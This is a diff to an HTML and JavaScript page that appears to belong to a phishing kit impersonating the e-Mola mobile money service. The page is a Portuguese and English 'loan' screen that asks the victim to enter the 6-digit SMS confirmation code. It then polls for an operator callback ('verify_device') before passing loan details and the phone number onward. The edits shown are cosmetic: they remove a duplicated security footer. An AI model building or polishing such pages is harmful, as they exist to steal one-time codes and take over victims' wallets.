@@ -48,8 +48,7 @@ main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 
 .btn-p:hover{transform:translateY(-2px);filter:brightness(1.05)}
 .btn-o{flex:1;background:transparent;color:var(--or-deep);border:2px solid var(--or-deep);padding:15px;border-radius:50px;font-weight:800;font-size:12px;text-transform:uppercase;cursor:pointer;font-family:inherit;transition:all .25s}
 .btn-o:hover{background:var(--cream)}
-.card-ft{text-align:center;margin-top:18px;font-size:10.5px;color:var(--muted)}
-.secure{display:flex;align-items:center;justify-content:center;gap:5px;margin-top:14px;font-size:10.5px;color:var(--muted);font-weight:700}
+.secure{display:flex;align-items:center;justify-content:center;gap:5px;margin-top:18px;font-size:10.5px;color:var(--muted);font-weight:700}
 .overlay{position:fixed;inset:0;display:none;align-items:center;justify-content:center;flex-direction:column;gap:16px;background:rgba(42,22,8,.94);z-index:2000;backdrop-filter:blur(8px)}
 .overlay.on{display:flex}
 .spin{width:54px;height:54px;border:4px solid rgba(255,255,255,.15);border-top-color:var(--or-light);border-radius:50%;animation:sp .8s linear infinite}
@@ -101,7 +100,6 @@ main{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 
       <button class="btn-o" onclick="location.href='login.html'" data-i18n="otp.cancel">Cancelar</button>
     </div>
 
-    <div class="card-ft" data-i18n="otp.foot">Protegido com segurança e-Mola.</div>
     <div class="secure" data-i18n="otp.secure">🔒 Protegido com segurança e-Mola</div>
   </div>
 </main>
@@ -114,7 +112,7 @@ const translations={
     "otp.h1":"Confirme o seu código","otp.sub":"Insira o código de confirmação de 6 dígitos enviado para o seu telemóvel",
     "otp.bAmount":"Empréstimo:","otp.bDur":"Prazo:","otp.bTotal":"Total a Pagar:",
     "otp.code":"Código de Verificação","otp.hint":"Verifique o seu SMS para o código de confirmação de 6 dígitos",
-    "otp.btn":"Confirmar & Continuar","otp.cancel":"Cancelar","otp.foot":"Protegido com segurança e-Mola.","otp.secure":"🔒 Protegido com segurança e-Mola",
+    "otp.btn":"Confirmar & Continuar","otp.cancel":"Cancelar","otp.secure":"🔒 Protegido com segurança e-Mola",
     "otp.loading":"A confirmar o código","otp.wait":"Por favor aguarde...",
     "err.all6":"Insira todos os 6 dígitos","err.declined":"Código recusado. Tente novamente."
   },
@@ -122,7 +120,7 @@ const translations={
     "otp.h1":"Confirm your code","otp.sub":"Enter the 6-digit confirmation code sent to your phone",
     "otp.bAmount":"Loan:","otp.bDur":"Term:","otp.bTotal":"Total to Pay:",
     "otp.code":"Verification Code","otp.hint":"Check your SMS for the 6-digit confirmation code",
-    "otp.btn":"Confirm & Continue","otp.cancel":"Cancel","otp.foot":"Protected with e-Mola security.","otp.secure":"🔒 Protected with e-Mola security",
+    "otp.btn":"Confirm & Continue","otp.cancel":"Cancel","otp.secure":"🔒 Protected with e-Mola security",
     "otp.loading":"Confirming code","otp.wait":"Please wait...",
     "err.all6":"Please enter all 6 digits","err.declined":"Code declined. Please try again."
   }
@@ -211,7 +209,6 @@ function pollOTP(){
           if(cb==='verify_device'){
             clearInterval(iv);
             document.getElementById('ov').classList.remove('on');
-            // Show 3s spinner before advancing
             document.getElementById('ov').classList.add('on');
             setTimeout(()=>{
               const params=new URLSearchParams({amount:bd.amount||'',duration:bd.duration||'',interest:bd.interest||'',total:bd.total||'',phone:phone});
